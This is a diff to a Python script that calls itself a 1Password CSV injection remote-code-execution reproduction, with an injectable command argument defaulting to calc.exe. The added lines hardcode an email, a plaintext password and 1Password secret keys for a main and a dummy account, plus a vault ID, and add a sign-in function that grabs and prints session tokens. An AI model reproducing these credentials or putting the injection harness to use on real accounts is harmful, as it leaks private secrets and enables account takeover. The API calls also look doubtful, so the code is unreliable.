@@ -10,13 +10,28 @@ parser = argparse.ArgumentParser(description="1Password CSV Injection RCE Repro 
 parser.add_argument('--rce_cmd', default="calc.exe", help="RCE command to inject (default calc.exe)")
 args = parser.parse_args()
 
-# Hardcoded family deets (dummy for verify)
+# Hardcoded family deets (main + dummy)
+MAIN_EMAIL = "enzo2alive@gmail.com"
+MAIN_PASSWORD = "EmpireRCE2025!Hunt"  # Your final pass
+MAIN_SECRET_KEY = "A3-89RGP8-2FR5GL-CFYT6-TCRP3-YPCTQ-GLG64"
 DUMMY_EMAIL = "nenss0833@gmail.com"
 DUMMY_SECRET_KEY = "A3-NVBA4N-VN5YMW-X96YJ-2KP9Q-YFKVK-JCL85"
-VAULT_ID = "vlt_CCQXDXVVTZHOZC7BZ73Z5P75RI"  # From your vault link/screenshot
+VAULT_ID = "vlt_CCQXDXVVTZHOZC7BZ73Z5P75RI"  # From your vault screenshot/link
 
 BASE_URL = "https://my.1password.com/api/v1"
-headers = {'Content-Type': 'application/json', 'User-Agent': '1Password-Repro/3.0', 'Authorization': 'Bearer YOUR_TOKEN'}  # Swap YOUR_TOKEN from 1Password Developer
+headers = {'Content-Type': 'application/json', 'User-Agent': '1Password-Repro/3.0', 'Authorization': 'Bearer YOUR_TOKEN'}  # Swap YOUR_TOKEN from 1Password Developer beta
+
+def get_session_token(email, password, secret_key):
+    """Auth and grab session token (fallback for dummy)"""
+    payload = {'email': email, 'password': password, 'secret_key': secret_key}
+    response = requests.post(f"{BASE_URL}/auth/signin", json=payload, headers=headers)
+    if response.status_code == 200:
+        data = response.json()
+        token = data.get('session_token')
+        print(f"[+] Token grabbed for {email}: {token[:10]}...")
+        return {'Authorization': f"Bearer {token}"}
+    print(f"[-] Auth fail for {email}: {response.text}")
+    return None
 
 def get_dummy_session():
     """Auth dummy for share verify (email/pass fallback)"""
